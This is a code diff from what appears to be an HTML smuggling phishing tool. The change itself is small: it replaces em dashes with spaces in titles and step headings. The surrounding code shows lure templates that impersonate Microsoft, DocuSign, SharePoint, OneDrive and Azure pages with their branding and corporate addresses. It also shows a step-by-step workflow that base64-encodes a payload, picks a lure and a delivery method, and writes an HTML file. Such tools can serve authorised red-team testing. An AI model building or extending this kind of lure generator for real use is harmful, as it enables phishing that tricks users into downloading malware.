@@ -40,7 +40,7 @@ TEMPLATES = {
 
 TEMPLATE_STYLES = {
     '1': {
-        'title': 'Microsoft Account — Security Update Required',
+        'title': 'Microsoft Account  Security Update Required',
         'logo': 'Microsoft', 'logo_col': '#0078d4',
         'bg': '#f3f2f1', 'card_bg': '#ffffff',
         'heading': 'Action Required: MFA Policy Update',
@@ -49,7 +49,7 @@ TEMPLATE_STYLES = {
         'footer': 'Microsoft Corporation · One Microsoft Way · Redmond, WA 98052', 'icon': '🔐',
     },
     '2': {
-        'title': 'DocuSign — Document Ready for Review',
+        'title': 'DocuSign  Document Ready for Review',
         'logo': 'DocuSign', 'logo_col': '#0033a0',
         'bg': '#f5f5f5', 'card_bg': '#ffffff',
         'heading': 'You have a document to review and sign',
@@ -58,7 +58,7 @@ TEMPLATE_STYLES = {
         'footer': 'DocuSign · 221 Main Street Suite 1000 · San Francisco, CA 94105', 'icon': '📄',
     },
     '3': {
-        'title': 'SharePoint — Shared File Notification',
+        'title': 'SharePoint  Shared File Notification',
         'logo': 'SharePoint', 'logo_col': '#038387',
         'bg': '#f3f2f1', 'card_bg': '#ffffff',
         'heading': 'A file has been shared with you',
@@ -67,7 +67,7 @@ TEMPLATE_STYLES = {
         'footer': 'Microsoft SharePoint · Powered by Microsoft 365', 'icon': '📊',
     },
     '4': {
-        'title': 'OneDrive — Secure File Download',
+        'title': 'OneDrive  Secure File Download',
         'logo': 'OneDrive', 'logo_col': '#0364b8',
         'bg': '#f3f2f1', 'card_bg': '#ffffff',
         'heading': 'Your file is ready to download',
@@ -76,7 +76,7 @@ TEMPLATE_STYLES = {
         'footer': 'Microsoft OneDrive · Microsoft 365', 'icon': '☁️',
     },
     '5': {
-        'title': 'Azure Portal — Security Alert',
+        'title': 'Azure Portal  Security Alert',
         'logo': 'Microsoft Azure', 'logo_col': '#0089d6',
         'bg': '#1b1b1b', 'card_bg': '#2d2d2d',
         'heading': 'Security Alert: Action Required',
@@ -213,7 +213,7 @@ def main():
 """)
         return
 
-    print(f"  {bold('Step 1 — Payload')}")
+    print(f"  {bold('Step 1  Payload')}")
     print(f"  {'─'*50}")
 
     payload_path = args.payload
@@ -234,7 +234,7 @@ def main():
     print(green('done'))
     print(f"  {dim(f'Base64 size: {len(payload_b64)/1024:.1f} KB')}")
 
-    print(f"\n  {bold('Step 2 — Lure Template')}")
+    print(f"\n  {bold('Step 2  Lure Template')}")
     print(f"  {'─'*50}")
     template_choice = args.template or choose('Select lure template:', TEMPLATES)
 
@@ -251,7 +251,7 @@ def main():
 
     print(f"  {green('✓')} Template: {bold(TEMPLATES[template_choice])}")
 
-    print(f"\n  {bold('Step 3 — Delivery Method')}")
+    print(f"\n  {bold('Step 3  Delivery Method')}")
     print(f"  {'─'*50}")
     methods = {
         '1': 'Click to download (button trigger)',
@@ -262,7 +262,7 @@ def main():
     method = args.method or choose('Select delivery method:', methods)
     print(f"  {green('✓')} Method: {bold(methods[method])}")
 
-    print(f"\n  {bold('Step 4 — Output')}")
+    print(f"\n  {bold('Step 4  Output')}")
     print(f"  {'─'*50}")
     output_path = ask('Output HTML file', args.output or f"smug_{Path(payload_path).stem}.html")
 
